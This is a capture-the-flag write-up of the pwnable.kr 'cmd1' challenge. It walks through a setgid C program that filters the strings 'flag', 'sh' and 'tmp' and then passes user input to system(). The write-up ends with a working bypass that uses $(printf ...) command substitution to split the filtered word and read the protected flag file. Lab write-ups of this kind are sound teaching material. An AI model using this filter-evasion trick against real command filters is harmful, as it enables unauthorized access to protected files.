# Challenge #12 - cmd1

## Challenge Description:

> Mommy! what is PATH environment in Linux?
>
> ```bash
> ssh cmd1@pwnable.kr -p2222 (pw:guest)
> ```

---

## Pre-Analysis

Okay lets see what we have to work with!

```bash
cmd1@ubuntu:~$ ls -l
total 24
-r-xr-sr-x 1 root cmd1_pwn 16056 Mar 21 09:49 cmd1
-rw-r--r-- 1 root root       353 Mar 21 09:47 cmd1.c
-r--r----- 1 root cmd1_pwn    46 Apr  1 06:06 flag
```

We have an executable, its corresponding C file and the flag for which we don't have read permissions... Not a lot to work with from this perspective, let's move on to static analysis!

## Static Analysis

Let's examine `cmd1.c`:

```C
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        setregid(getegid(), getegid());
        system( argv[1] );
        return 0;
}
```

OK we have 2 functions, `main` and `filter`.

The program first changes the $PATH environment variable which includes paths to executables such as `cat`. This doesn't matter to us that much, simply use `/bin/cat` instead for example.

Then the program runs the `filter` function, if it returns 0 it runs the command in `argv[1]` and if not it exits.

So essentially:
1. Change `$PATH` environment variable
2. Run `filter` function
3. If nonzero is returned, exit program
4. Else, call the command specified in the command-line argument by the user

The `filter` function:
- Returns nonzero if any of these conditions is true:
  - `cmd` contains the string `"flag"`
  - `cmd` contains the string `"sh"`
  - `cmd` contains the string `"tmp"`
- Else it returns zero

## Plan

OK so we know how the program works, now what remains is how we can make it run `/bin/cat flag` without the `filter` returning a nonzero value!

There are multiple ways to solve this one but the simplest one in my opinion is to simply "split" the `"flag"` string into a couple parts. In order to do that we can pass a BASH command as `argv[1]` like so:

```bash
./program "$(printf "/bin/cat cy%s" "ber")"
```

What the program sees is just the string we put in which does not contain `"cyber"` but when the program then runs `system()` on our argument it performs command substitution and effectively runs `/bin/cat cyber` as we want it to!

## Exploit

Right! Let's run this exploit on the target program:

```bash
cmd1@ubuntu:~$ ./cmd1 '$(printf "/bin/cat %s%s" "fl" "ag")'
<cmd1_flag_here>
cmd1@ubuntu:~$
```

### And we are successful!
